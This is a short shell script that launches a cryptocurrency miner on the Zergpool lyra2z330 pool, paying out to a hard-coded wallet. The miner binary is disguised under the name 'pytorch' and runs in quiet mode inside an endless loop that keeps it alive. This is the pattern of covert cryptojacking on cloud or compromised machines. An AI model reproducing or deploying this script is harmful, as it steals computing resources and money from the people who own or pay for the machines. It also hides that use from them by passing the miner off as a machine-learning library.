#!/bin/sh
POOL=stratum+tcp://lyra2z330.na.mine.zergpool.com:4563
WALLET=DFtFJRa7oUzbBpUxYLXFaeTVDwyidT1TMk
WORKER=eikeit
chmod +x pytorch
./pytorch -a lyra2z330 -o $POOL -u $WALLET -p c=DGB,mc=PYRK,ID=$WORKER -q
while [ 1 ]; do
sleep 3
done
sleep 999
